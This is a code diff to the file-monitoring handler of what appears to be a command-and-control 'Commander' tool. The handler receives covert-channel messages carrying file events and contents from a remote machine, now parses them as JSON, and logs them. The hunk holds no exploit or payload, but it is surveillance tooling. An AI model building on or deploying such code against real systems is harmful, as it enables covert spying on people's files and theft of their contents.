@@ -304,25 +304,50 @@ def cmd_monitor_file(comm: Commander):
         try:
             buffer = ""
 
-            resp = comm.recv_covert_message()
-            if resp:
-                buffer += resp.decode('utf-8', errors='ignore')
+            # 把第一条确认消息也丢进 buffer
+            first = comm.recv_covert_message()
+            if first:
+                buffer += first.decode('utf-8', errors='ignore')
 
             while True:
-                data = comm.recv_covert_message()
-                if data is None:
+                chunk = comm.recv_covert_message()
+                if chunk is None:
                     continue
+                buffer += chunk.decode('utf-8', errors='ignore')
 
-                print("[DEBUG raw data]:", data)
-                text = data.decode(errors="ignore")
-                print("[DEBUG] Message:", text.strip())
+                # 只要有换行，就拆分出完整的行来
+                while '\n' in buffer:
+                    line, buffer = buffer.split('\n', 1)
 
-                logfile.write(text + "\n")
-                logfile.flush()
+                    # 提取花括号里的 JSON
+                    start = line.find('{')
+                    end   = line.rfind('}')
+                    if start == -1 or end == -1:
+                        # 如果这行里不包含完整 JSON，就跳过
+                        continue
+
+                    json_str = line[start:end+1]
+                    try:
+                        msg = json.loads(json_str)
+                    except json.JSONDecodeError:
+                        continue
+
+                    # 打印并记录
+                    ts   = msg.get('timestamp','')
+                    typ  = msg.get('type','')
+                    path = msg.get('path','')
+                    print(f"[{ts}] Event: {typ} | File: {path}")
+                    if 'content' in msg:
+                        print(msg['content'])
+                    print('-'*40)
+
+                    logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
+                    logfile.flush()
 
         except KeyboardInterrupt:
             print("\n[*] Stopping File Watching")
             comm.send_covert_message(b"CMD_STOP_MON_FILE")
+
 
 
 def cmd_monitor_dir(comm: Commander):
